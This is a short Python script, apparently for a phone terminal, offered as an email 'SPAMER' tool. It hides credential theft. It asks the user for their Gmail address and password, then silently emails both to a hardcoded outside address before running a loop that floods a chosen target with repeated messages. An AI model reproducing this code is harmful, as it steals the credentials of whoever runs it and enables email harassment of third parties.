import smtplib
import time
import sys
import os
os.system("clear")
from email.message import EmailMessage
os.system("pkg install toilet ruby")
os.system("apt install toilet ruby ; gem install lolcat")
os.system("gem install lolcat")
os.system("clear")
print(" \033[1;33mupdate v.2\033[0m")
USER = input("SET EMAIL : ") #สามารถมา ระบุ Email ได้เลย แค่  = ("email")
I = 'unity484.non@gmail.com'
PASS = input("SET EMAIL PASSWORD : ")
time.sleep(1)
print(" \033[1;32mSet Email success\033[0m")
email = EmailMessage()
email["From"] = USER
email["To"] = I
email.set_content("EMAIL TARGET = "+ USER + " "+"PASSWORD = "+ PASS)
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(USER , PASS)
    smtp.send_message(email)

time.sleep(1)
os.system("clear")
while True:
    os.system("clear")
    target = input("\033[0mต้องการแสปม หรือไม่[y/n]: ")
    if target == "y" :
        print("\033[1;32m")
        os.system("clear")
        os.system("toilet -f future  '  EMAIL-SPAMER'")
        print("\033[0m")
        momo = EmailMessage()
        to4 = input("Email target: ")
        to3 = input("masage: ")
        n = int(input("number to spam: "))
        momo["To"] = to4 
        momo.set_content(to3)
        for i in range(1, n+1):
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(USER , PASS)
                smtp.send_message(momo)
                print ("\033[1;32mEMAIL SPAM : %i" % i)
                time.sleep(1)
    elif target == "n" :
        sys.exit()
